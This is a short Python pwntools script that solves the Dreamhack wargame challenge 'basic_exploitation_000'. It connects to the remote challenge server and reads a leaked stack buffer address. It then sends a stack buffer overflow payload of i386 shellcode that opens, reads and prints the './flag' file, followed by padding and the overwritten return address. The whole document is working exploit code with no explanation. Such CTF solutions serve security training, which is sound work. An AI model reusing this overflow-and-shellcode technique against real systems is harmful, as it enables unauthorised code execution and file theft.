from pwn import *

context.arch = 'i386'
#context.log_level = 'debug'

#r = process('./basic_exploitation_000')
r = remote('host3.dreamhack.games', 18720)
e = ELF('./basic_exploitation_000')

shellcode = shellcraft.pushstr('./flag')
shellcode += shellcraft.open('esp',0,0)
shellcode += shellcraft.read('eax', 'esp', 100)
shellcode += shellcraft.write(1, 'esp', 100)
shellcode = asm(shellcode)

r.recvuntil('buf = (')
addr = r.recvn(10)
addr = int(addr, 16)

payload = shellcode + b'a'*(0x84-len(shellcode)) + p32(addr)
r.sendline(payload)
r.interactive()
